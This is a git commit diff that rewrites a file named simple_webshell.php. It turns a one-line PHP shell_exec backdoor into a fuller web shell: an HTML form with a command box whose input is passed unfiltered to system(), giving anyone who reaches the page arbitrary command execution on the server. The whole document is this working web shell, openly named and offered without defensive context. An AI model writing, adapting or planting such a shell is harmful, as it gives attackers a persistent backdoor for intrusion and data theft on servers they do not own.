cdf0e1c7c6c34b6a23efc87a417d230fbc732739
skandia20 <42287068+skandia20@users.noreply.github.com>
2026-04-02 10:28:07 +0900

    modified:   simple_webshell.php

--- simple_webshell.php
+++ simple_webshell.php
@@ -1,3 +1,20 @@
+<html>
+<body>
+<form method="GET" name="
+<?php 
+echo basename($_SERVER['PHP_SELF']); 
+?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="70">
+
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
 <?php
-	echo shell_exec($_GET['cmd']);
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
 ?>
+</pre>
+</body>
+</html>
